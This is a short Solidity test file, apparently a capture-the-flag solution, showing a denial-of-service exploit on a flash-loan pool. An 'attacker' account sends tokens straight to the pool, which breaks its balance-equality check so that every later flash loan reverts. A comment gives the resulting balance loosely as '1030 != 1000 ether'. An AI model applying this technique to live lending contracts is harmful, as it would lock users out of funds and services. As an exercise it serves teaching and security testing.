// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/FlashPoolFixture.sol";

contract FlashPoolTest is FlashPoolFixture {

    function setUp() public override {
        super.setUp();
    }

    function test_flashPool() public {

        vm.startPrank(attacker);
        //In the flash loan function, a require to execute the loan is  assert(poolBalance == balanceBefore)
        //So if we call this function after we transfer any quantity to the pool, this condition will stop the loan.
        token.transfer(address(pool), 30);
        //Poolbalance = 1030 != 1000 ether
        vm.stopPrank();
        _assertions();
    }

    function _assertions() internal {
        // Expect the FlashPoolLender to revert on all flash loans
        vm.expectRevert();
        vm.prank(user);
        receiver.executeFlashLoan(10);
    }
}